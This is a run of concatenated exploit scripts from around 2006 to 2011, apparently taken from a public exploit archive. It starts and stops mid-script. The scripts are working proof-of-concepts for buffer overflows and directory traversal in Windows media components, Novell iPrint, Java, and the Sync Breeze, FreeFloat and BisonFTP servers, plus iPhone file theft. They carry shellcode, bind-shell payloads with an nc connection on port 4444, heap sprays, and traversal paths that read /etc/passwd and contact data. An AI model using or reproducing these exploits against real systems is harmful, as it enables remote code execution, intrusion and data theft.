\x61\x6a\x6a\x64\x4d\x63\x31\x79\x52\x4a\x4b\x69\x64\x67\x4b\x32\x74\x65\x74\x66\x64\x31\x65\x4a\x45\x6c\x4b\x71\x4f\x31\x34\x57\x71\x48\x6b\x52\x46\x6e\x6b\x64\x4c\x52\x6b\x4e\x6b\x31\x4f\x77\x6c\x54\x41\x68\x6b\x4c\x4b\x57\x6c\x6c\x4b\x57\x71\x4a\x4b\x4e\x69\x41\x4c\x65\x74\x67\x74\x4a\x63\x75\x61\x4f\x30\x51\x74\x6c\x4b\x61\x50\x50\x30\x4f\x75\x4f\x30\x32\x58\x64\x4c\x4c\x4b\x71\x50\x54\x4c\x4c\x4b\x70\x70\x57\x6c\x4e\x4d\x6e\x6b\x73\x58\x35\x58\x4a\x4b\x36\x69\x6c\x4b\x4d\x50\x4c\x70\x67\x70\x75\x50\x37\x70\x4c\x4b\x45\x38\x35\x6c\x41\x4f\x57\x41\x68\x76\x53\x50\x30\x56\x6e\x69\x6b\x48\x6f\x73\x6f\x30\x63\x4b\x62\x70\x30\x68\x58\x70\x6f\x7a\x57\x74\x51\x4f\x45\x38\x6f\x68\x59\x6e\x4f\x7a\x66\x6e\x62\x77\x69\x6f\x38\x67\x73\x53\x52\x41\x30\x6c\x71\x73\x64\x6e\x35\x35\x30\x78\x70\x65\x45\x50\x44'
		
					
		if len(shellcode) > 1120:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 1120:
			dif = 1120- len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
				
		fdW= open('exploit.mswmm', 'wb+')
		fdW.write(str1)
		fdW.write(size_first_new)
		fdW.write(str2)
		fdW.write(size_second_new)
		fdW.write(str3)
		fdW.write(p2p)
		fdW.write('\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90')     # padding		
		fdW.write(shellcode)
		fdW.write(str4)
		
		
		fdW.close()
		fdR.close()
		print '[-] Movie Maker file(.MSWMM) generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <  Day 5 (Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

 http://www.exploit-db.com/moaub-5-microsoft-mpeg-layer-3-audio-stack-based-overflow/
 https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/14895.zip (moaub-5-exploit.zip)

'''

'''
  Title               :  Microsoft MPEG Layer-3 Remote Command Execution Exploit
  Version             :  l3codeca.acm (XP SP2 / XP SP3)
  Analysis            :  http://www.abysssec.com
  Vendor              :  http://www.microsoft.com
  Impact              :  Ciritical
  Contact             :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter             :  @abysssec
  CVE                 :  CVE-2010-0480

'''

import sys
import struct
def main():
   
    try:
		strHTML = '''
		<html>
		<head>
		</head>
		<body>
		<object classID="exploit.dll#exploit.Shellcode"></object>
		<OBJECT ID="MediaPlayer" CLASSID="CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95" CODEBASE="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab# Version=5,1,52,701" STANDBY="Loading Microsoft Windows Media Player components..." TYPE="application/x-oleobject" width="280" height="46">
		<param name="fileName" value="test.avi">
		<param name="animationatStart" value="true">
		<param name="transparentatStart" value="true">
		<param name="autoStart" value="true">
		<param name="showControls" value="true">
		<param name="Volume" value="-300">
		<embed type="application/x-mplayer2" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/" src="test.avi" name="MediaPlayer" width=280 height=46  autostart=1 showcontrols=1 volume=-300>
		</embed>
		</OBJECT>
		</body>
		</html> '''
		fHTML = open('index.html', 'w')
		fHTML.write(strHTML)
		fHTML.close()
		fdR = open('exploit.dll', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:1380]
		str2 = strTotal[2115:]
		shellcode = '\xEB\x6B\x5A\x31\xC9\x6A\x10\x52\x42\x52\x51\xFF\xD0\x53\x68\x7E\xD8\xE2\x73\xFF\xD6\x6A\x00\xFF\xD0\xFF\xD7\x50\x68\xA8\xA2\x4D\xBC\xFF\xD6\xE8\xDA\xFF\xFF\xFF\x00\x54\x68\x65\x20\x65\x78\x70\x6C\x6F\x69\x74\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x21\x00\x5E\x6A\x30\x59\x64\x8B\x19\x8B\x5B\x0C\x8B\x5B\x1C\x8B\x1B\x8B\x5B\x08\x53\x68\x8E\x4E\x0E\xEC\xFF\xD6\x89\xC7\xE8\xB3\xFF\xFF\xFF\x55\x53\x45\x52\x33\x32\x00\xE8\xD3\xFF\xFF\xFF\x53\x55\x56\x57\x8B\x6C\x24\x18\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x32\x49\x8B\x34\x8B\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38\xE0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\xEB\x02\x31\xC0\x5F\x5E\x5D\x5B\xC2\x08\x00'
		
		if len(shellcode) > 735:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 735:
			dif = 735 - len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
		fdW= open('exploit.dll', 'wb+')
		fdW.write(str1)
		fdW.write(shellcode)
		fdW.write(str2)
		fdW.close()
		fdR.close()
		print '[-] Html file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()# sploit creater by redsand@blacksecurity.org
# ms06-005 advisory proof of concept
# heap overflow in wmf.dll @ 0x0035920a
# denial of service, cuz we can't get this to play nice
    
#shamelessly stolen from CANVAS code
def intel_order(i):
    str=""
    a=chr(i % 256)
    i=i >> 8
    b=chr(i % 256)
    i=i >> 8
    c=chr(i % 256)
    i=i >> 8
    d=chr(i % 256)
    
    str+="%c%c%c%c" % (a,b,c,d)

    return str

def stroverwrite(instring,overwritestring,offset):
    head=instring[:offset]
    #print head
    tail=instring[offset+len(overwritestring):]
    #print tail
    result=head+overwritestring+tail
    return result


#options
#SEH HAndle

#anything with a call/jmp  edi/ecx + 4 or more
EIP=0x75e1692c # call edi +20 for win2k pro eng in oleaut
DUMMY=0xccccccccL
filename = "rbl4ck-06-005.bmp"

header =  "\x42\x4d\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x28\x00"
header += "\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x04\x00\x00\x00"
header += "\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x01\x00\x04\x00\x00\x00"
header += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\xCC"

c0de    = "\x90" * 350
c0de    +=  "\xCD\x03" 
c0de    += "\xEB\x61\x56\x6A\x30\x59\x64\x8B\x01\x8B\x40\x0C"
c0de    += "\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\xC3\x60\x8B\x6C"
c0de    += "\x24\x24\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B"
c0de    += "\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34"
c0de    += "\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74"
c0de    += "\x07\xC1\xCF\x0D\x01\xC7\xEB\xF4\x3B\x7C\x24\x28"
c0de    += "\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B"
c0de    += "\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24"
c0de    += "\x1C\x61\xC3\xE8\x9A\xFF\xFF\xFF\x68\x98\xFE\x8A"
c0de    += "\x0E\x50\xE8\xA2\xFF\xFF\xFF\xEB\x02\xEB\x05\xE8"
c0de    += "\xF9\xFF\xFF\xFF\x5B\x83\xC3\x1C\x33\xC9\x88\x0B"
c0de    += "\x83\xEB\x0B\x41\x51\x53\xFF\xD0\x90\x6E\x6F\x74"
c0de    += "\x65\x70\x61\x64\x2E\x65\x78\x65\x01"
#tag
c0de    += "0wn3dbyr3ds4nd"

for on in range(256):
    c0de += intel_order(EIP-80)

body = ""
r=0x88888800L
for on in range(235):
    r+=0x01L
    body += intel_order(r)

    
body    += c0de

body = stroverwrite(body,intel_order(EIP-4),56)
body = stroverwrite(body,intel_order(EIP),96)
body = stroverwrite(body,intel_order(EIP),160)
body = stroverwrite(body,intel_order(EIP-0x3c),708)
body = stroverwrite(body,intel_order(EIP),828)
body = stroverwrite(body,intel_order(EIP),868)
body = stroverwrite(body,intel_order(EIP),936)
#
#here's our call eax+4
body = stroverwrite(body,intel_order(EIP-4),948)
#
#
body = stroverwrite(body,intel_order(EIP),300)





print "MS06-005 Heap Overflow by redsand [at] blacksecurity.org"
print "Writing filename " + filename + "..."

try:                                
    fsock = open(filename, "wb+", 0) 
    try:                           
        fsock.write(header + body ); 
    finally:                        
        fsock.close()
except IOError:                     
    pass


print "success."

# milw0rm.com [2006-02-16]
'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 


  Title            : Novell iPrint Client Browser Plugin call-back-url stack overflow
  Version          : iPrint Client plugin v5.42 (XP SP3)
  Analysis         : http://www.abysssec.com
  Vendor           : http://www.novell.com
  Impact           : Critical
  Contact          : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter          : @abysssec
  CVE              : CVE-2010-1527

http://www.exploit-db.com/moaub-19-novell-iprint-client-browser-plugin-call-back-url-stack-overflow/

'''

import sys;
#calc.exe shellcode
temp = """<script>
     
	 shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+ 
                    '%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+ 
                    '%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+ 
                    '%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+ 
                    '%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+ 
                    '%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+ 
                    '%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+ 
                    '%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e'); 
                      
     nops=unescape('%u9090%u9090'); 
     headersize =20; 
     slackspace= headersize + shellcode.length; 
     while(nops.length< slackspace) nops+= nops; 
     fillblock= nops.substring(0, slackspace); 
     block= nops.substring(0, nops.length- slackspace); 
     while( block.length+ slackspace<0x50000) block= block+ block+ fillblock; 
     memory=new Array(); 
     for( counter=0; counter<200; counter++) memory[counter]= block + shellcode;     
</script>
<object ID='target' classid='clsid:36723f97-7aa0-11d4-8919-ff2d71d0d32c'>
<param name='operation' value='op-client-interface-version' />
<param name='result-type' value='url' />
<param name='call-back-url' value='

"""
i=0
while(i<1000):
    temp = temp + "\x0a";
    i=i+1

temp = temp + """' />
</object>
"""

htmlFile = open("call-back-url.html","w")
htmlFile.write(temp)
htmlFile.close()
'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

'''

'''
  Title             : Java CMM readMabCurveData stack overflow
  Version           : Java runtime < 6.19 
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.java.com
  Impact            : Critical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-0838
  MOAUB Number      : MOAUB_20_BA

http://www.exploit-db.com/moaub-20-java-cmm-readmabcurvedata-stack-overflow/
https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/15056.zip (moaub-20-exploit.zip)
'''

import sys

def main():
   
    try:
		strHTML = '''
		<HTML>
		<HEAD>
		</HEAD>
		<BODY>
		<H1>You have exploited!!!</H1>
		<P><APPLET code="Curve.class" WIDTH="600" HEIGHT="400">
		</APPLET></P>
		</BODY>
		</HTML>		'''
		fHTML = open('index.html', 'w')
		fHTML.write(strHTML)
		fHTML.close()
		fdR = open('kodak.icm', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:9154]
		str2 = strTotal[9648:]
		shellcode = '\xEB\x6B\x5A\x31\xC9\x6A\x10\x52\x42\x52\x51\xFF\xD0\x53\x68\x7E\xD8\xE2\x73\xFF\xD6\x6A\x00\xFF\xD0\xFF\xD7\x50\x68\xA8\xA2\x4D\xBC\xFF\xD6\xE8\xDA\xFF\xFF\xFF\x00\x54\x68\x65\x20\x65\x78\x70\x6C\x6F\x69\x74\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x21\x00\x5E\x6A\x30\x59\x64\x8B\x19\x8B\x5B\x0C\x8B\x5B\x1C\x8B\x1B\x8B\x5B\x08\x53\x68\x8E\x4E\x0E\xEC\xFF\xD6\x89\xC7\xE8\xB3\xFF\xFF\xFF\x55\x53\x45\x52\x33\x32\x00\xE8\xD3\xFF\xFF\xFF\x53\x55\x56\x57\x8B\x6C\x24\x18\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x32\x49\x8B\x34\x8B\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38\xE0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\xEB\x02\x31\xC0\x5F\x5E\x5D\x5B\xC2\x08\x00'
		
		if len(shellcode) > 494:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 494:
			dif = 494 - len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
		fdW= open('kodak.icm', 'wb+')
		fdW.write(str1)
		fdW.write(shellcode)
		fdW.write(str2)
		fdW.close()
		fdR.close()
		print '[-] Html file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()#!/usr/bin/python

# Exploit Title: Sync Breeze Server v2.2.30 Remote BOF Exploit
# Date: 10/10/2010
# Author: Xsploited Security [aka xsploitedsec]
# URL: http://www.x-sploited.com/
# Contact: xsploitedsecurity [at] x-sploited.com
# Software Link: http://www.syncbreeze.com/setups/syncbreezesrv_setup_v2.2.30.exe
# Version: v2.2.30 (Others are most likely effected as well)
# Tested on: A Windows XP SP3 machine
# CVE : N/A

### Vulnerability Information: ###
# A vulnerability exists in the way Sync Breeze v2.2.30 processes its login requests after accepting a connection from a remote client.
# If a packet with a length greater than 484 bytes is received with the command prefix "ServerLogin." the effected Service (syncbrs.exe)
# will crash, from the result of a buffer overflow. An attacker can easily leverage this vulnerability and control execution flow /
# execute arbitrary code.
###
# This PoCs Usage:
# 1. Verify that the service is running on the remote machine, the default port is 9121.
# 2. Execute syncbreeze.py against the host
# 3. Check remote machines process list for calc to verify successful command execution. (Running as SYSTEM, on my test machine at least..)
###
# Other notes:
# If the software is installed from an administrator account, shellcode will be executed at admin / (system) level. This could be a potential
# privelage escilation attack vector (although I have not verified this yet)

# I am sure a lot more can be done with this (fit more shellcode, universal etc.) I'll leave that up to researchers however. 
# Have fun!
###

### Shouts:
# kAoTiX - Helping me verify this bug/exploit
# MAX - Keeps me entertained, makes me giggle
# CorelanCoder - Your tutorials are absolutely fking awesome
# exploit-db, offensive-sec, packetstormsecurity and all security teams and sites!
###

import sys,socket

if len(sys.argv) != 2:
    print "[!] Usage: ./syncbreeze.py <Target IP>"
    sys.exit(1)

about = "=================================================\n"
about += "Title: Sync Breeze Server v2.2.30 Remote BOF PoC\n"
about +=  "Author: xsploited security\nURL: http://www.x-sploited.com/\n"
about +=  "Contact: xsploitedsecurity [at] gmail.com\n"
about +=  "=================================================\n"
print about

host = sys.argv[1]
port = 9121 			#default server port, unchangeable (I think)

# windows/exec - 218 bytes / http://www.metasploit.com
# Encoder: x86/fnstenv_mov / EXITFUNC=seh, CMD=calc
calc = ("\x6a\x31\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x97\x8c" 
"\x8a\x10\x83\xeb\xfc\xe2\xf4\x6b\x64\x03\x10\x97\x8c\xea\x99" 
"\x72\xbd\x58\x74\x1c\xde\xba\x9b\xc5\x80\x01\x42\x83\x07\xf8" 
"\x38\x98\x3b\xc0\x36\xa6\x73\xbb\xd0\x3b\xb0\xeb\x6c\x95\xa0" 
"\xaa\xd1\x58\x81\x8b\xd7\x75\x7c\xd8\x47\x1c\xde\x9a\x9b\xd5" 
"\xb0\x8b\xc0\x1c\xcc\xf2\x95\x57\xf8\xc0\x11\x47\xdc\x01\x58" 
"\x8f\x07\xd2\x30\x96\x5f\x69\x2c\xde\x07\xbe\x9b\x96\x5a\xbb" 
"\xef\xa6\x4c\x26\xd1\x58\x81\x8b\xd7\xaf\x6c\xff\xe4\x94\xf1" 
"\x72\x2b\xea\xa8\xff\xf2\xcf\x07\xd2\x34\x96\x5f\xec\x9b\x9b" 
"\xc7\x01\x48\x8b\x8d\x59\x9b\x93\x07\x8b\xc0\x1e\xc8\xae\x34" 
"\xcc\xd7\xeb\x49\xcd\xdd\x75\xf0\xcf\xd3\xd0\x9b\x85\x67\x0c" 
"\x4d\xfd\x8d\x07\x95\x2e\x8c\x8a\x10\xc7\xe4\xbb\x9b\xf8\x0b" 
"\x75\xc5\x2c\x72\x84\x22\x7d\xe4\x2c\x85\x2a\x11\x75\xc5\xab" 
"\x8a\xf6\x1a\x17\x77\x6a\x65\x92\x37\xcd\x03\xe5\xe3\xe0\x10" 
"\xc4\x73\x5f\x73\xf6\xe0\xe9\x10");
	
# Begin payload buffer:

packet_header = ("\x53\x65\x72\x76\x65\x72\x4C\x6F\x67\x69\x6E\x02");

junk = "\x90" * 256; 			#265 byte junk buffer to reach eip
eip = "\xFB\xF8\xAB\x71";		#jmp esp (via ws2_32.dll) 
nops = "\x90" * 12;				#small nop sled

# packet structure:
# [header][junk][eip][nops][shellcode][nops][nops]

packet = packet_header + junk + eip + nops + calc + nops + nops;

print "[*] Connecting to " + host + "...\r"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

print "[*] Connected, Sending payload\r"
s.send(packet + "\r\n")
print "[*] Payload sent successfully"
print "[*] Check the results\r"
s.close()#!/usr/bin/python
#
#[+]Exploit Title: FreeFloat FTP Server ACCL Buffer Overflow Exploit
#[+]Date: 19\06\2011
#[+]Author: mortis
#[+]Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
#[+]Version: 1.00
#[+]Tested On: Windows XP SP3 English
#[+]CVE: N/A
#

from socket import *
import sys, struct, os

def sploit(host, port):
	#open listener shell on port 4444

	sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
	sc += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
	sc += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
	sc += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
	sc += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
	sc += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
	sc += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
	sc += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
	sc += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
	sc += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
	sc += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
	sc += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
	sc += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
	sc += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
	sc += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
	sc += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
	sc += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
	sc += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
	sc += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
	sc += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
	sc += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
	sc += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
	sc += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
	sc += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
	sc += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"

	padding = "A"*246
	sled = "\x90"*20
	jmpesp = struct.pack('<L',0x7C874413) #jmp esp winxp3 
	 
	sploit = padding + jmpesp + sled + sc
	s = socket(AF_INET,SOCK_STREAM)
	s.connect((host,port))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send("PASS test\r\n")
	s.recv(1024)
	s.send("ACCL "+sploit+"\r\n")
	s.close()

if __name__ == '__main__':        
	if (len(sys.argv) < 3):
		print "\nUsage: freefloat.py <host> <port> \n"
		sys.exit()
	else:
		host = sys.argv[1] 
		port = sys.argv[2]
		sploit(host, int(port))
		os.system("nc " + host + " 4444")
		#!/usr/bin/python
##############################################################################
# Title     : CiscoKits TFTP Server Directory Traversal Vulnerability
# Author    : Antu Sanadi from SecPod Technologies (www.secpod.com)
# Vendor    : http://www.certificationkits.com/cisco-ccna-tftp-server/
# Advisory  : http://secpod.org/blog/?p=301
#             http://secpod.org/SECPOD_CiscoKits_TFTP_Server_Dir_Trav_POC.py
#             http://secpod.org/advisories/SECPOD_CiscoKits_TFTP_Server_Dir_Trav.txt
# Version   : CiscoKits CCNA TFTP Server 1.0.0.0
# Date      : 21/07/2011
##############################################################################
import sys, socket

def sendPacket(HOST, PORT, data):
    '''
    Sends UDP Data to a Particular Host on a Specified Port
    with a Given Data and Return the Response
    '''
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.sendto(data, (HOST, PORT))
    data = udp_sock.recv(1024)
    udp_sock.close()
    return data

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print "\tUsage: python exploit.py target_ip"
        print "\tExample : python exploit.py 127.0.0.1"
        print "\tExiting..."
        sys.exit(0)

    HOST = sys.argv[1]                               ## The Server IP
    PORT = 69                                        ## Default TFTP port

    data = "\x00\x01"                                ## TFTP Read Request
    data += "../" * 10 + "windows/win.ini" + "\x00"  ## Read win.ini file using directory traversal
    data += "netascii\x00"                           ## TFTP Type

    # netascii
    rec_data = sendPacket(HOST, PORT, data)
    print "Data Found on the target : %s " %(HOST)
    print rec_data.strip()
#!/usr/bin/python
#----------------------------------------------------------------
#Software : iPhone/iPad Phone Drive 1.1.1
#Type of vulnerability : Directory Traversal
#Tested On : iPhone 4 (IOS 4.3.3/Jailbroken)
#----------------------------------------------------------------
#Program Developer : http://ax.itunes.apple.com/app/id431033044?mt=8
#----------------------------------------------------------------
#Discovered by : Khashayar Fereidani
#Team Website : Http://IRCRASH.COM
#English Forums : Http://IRCRASH.COM/forums/
#Team Members : Khashayar Fereidani , Arash Allebrahim
#Email : irancrash [ a t ] gmail [ d o t ] com
#Facebook : http://facebook.com/fereidani
#Twitter : http://twitter.com/ircrash
#----------------------------------------------------------------
import urllib2
def urlread(url,file):
    url = url+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"+file
    u = urllib2.urlopen(url)
    localFile = open('result.html', 'w')
    localFile.write(u.read())
    localFile.close()
    print "file saved as result.html\nIRCRASH.COM 2011"
print "----------------------------------------\n- iPhone/iPad Phone Drive 1.1.1 DT     -\n- Discovered by : Khashayar Fereidani  -\n- http://ircrash.com/                  -\n----------------------------------------"
url = raw_input("Enter Address ( Ex. : http://192.168.1.101:8080 ):")
f = ["","/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb","/private/var/mobile/Library/Safari","/private/var/mobile/Library/Preferences/com.apple.accountsettings.plist","/private/var/mobile/Library/Preferences/com.apple.conference.plist","/etc/passwd"]
print f[1]
id = int(raw_input("1 : Phone Book\n2 : Safari Fav\n3 : Users Email Info\n4 : Network Informations\n5 : Passwd File\n6 : Manual File Selection\n Enter ID:"))
if not('http:' in url):
    url='http://'+url
if ((id>0) and (id<6)):
    file=f[id]
    urlread(url,file)
if (id==6):
    file=raw_input("Enter Local File Address : ")
    urlread(url,file)#!/usr/bin/python
# BisonFTP Server <=v3.5 Remote Buffer Overflow Exploit
# Newer version's not tested, maybe vulnerable too
# written by localh0t
# Date: 10/08/11
# Contact: mattdch0@gmail.com
# Follow: @mattdch
# www.localh0t.com.ar | www.mfsec.com.ar
# Thanks to: Pr0zac, Irakirashia, Kchito
# Targets: Windows XP SP3 Spanish (No DEP) (Change as you wish)
# Shellcode: List shell on port 4444 (Change as you wish)

from socket import *
import sys, struct, os, time

if (len(sys.argv) < 3):
	print "\nBisonFTP Server <=v3.5 Remote Buffer Overflow Exploit"
        print "\n	Usage: %s <host> <port> \n" %(sys.argv[0])
	sys.exit()

print "\n[!] Connecting to %s ..." %(sys.argv[1])

# connect to host
sock = socket(AF_INET,SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))
sock.recv(1024)
time.sleep(5)

# padding
buffer = "\x90" * 1092

# 368 bytes shellcode
buffer += ("\x33\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"+
"\xbb\xc1\x9c\x35\x83\xee\xfc\xe2\xf4\x47\x29\x15\x35\xbb\xc1"+
"\xfc\xbc\x5e\xf0\x4e\x51\x30\x93\xac\xbe\xe9\xcd\x17\x67\xaf"+
"\x4a\xee\x1d\xb4\x76\xd6\x13\x8a\x3e\xad\xf5\x17\xfd\xfd\x49"+
"\xb9\xed\xbc\xf4\x74\xcc\x9d\xf2\x59\x31\xce\x62\x30\x93\x8c"+
"\xbe\xf9\xfd\x9d\xe5\x30\x81\xe4\xb0\x7b\xb5\xd6\x34\x6b\x91"+
"\x17\x7d\xa3\x4a\xc4\x15\xba\x12\x7f\x09\xf2\x4a\xa8\xbe\xba"+
"\x17\xad\xca\x8a\x01\x30\xf4\x74\xcc\x9d\xf2\x83\x21\xe9\xc1"+
"\xb8\xbc\x64\x0e\xc6\xe5\xe9\xd7\xe3\x4a\xc4\x11\xba\x12\xfa"+
"\xbe\xb7\x8a\x17\x6d\xa7\xc0\x4f\xbe\xbf\x4a\x9d\xe5\x32\x85"+
"\xb8\x11\xe0\x9a\xfd\x6c\xe1\x90\x63\xd5\xe3\x9e\xc6\xbe\xa9"+
"\x2a\x1a\x68\xd3\xf2\xae\x35\xbb\xa9\xeb\x46\x89\x9e\xc8\x5d"+
"\xf7\xb6\xba\x32\x44\x14\x24\xa5\xba\xc1\x9c\x1c\x7f\x95\xcc"+
"\x5d\x92\x41\xf7\x35\x44\x14\xcc\x65\xeb\x91\xdc\x65\xfb\x91"+
"\xf4\xdf\xb4\x1e\x7c\xca\x6e\x48\x5b\x04\x60\x92\xf4\x37\xbb"+
"\xd0\xc0\xbc\x5d\xab\x8c\x63\xec\xa9\x5e\xee\x8c\xa6\x63\xe0"+
"\xe8\x96\xf4\x82\x52\xf9\x63\xca\x6e\x92\xcf\x62\xd3\xb5\x70"+
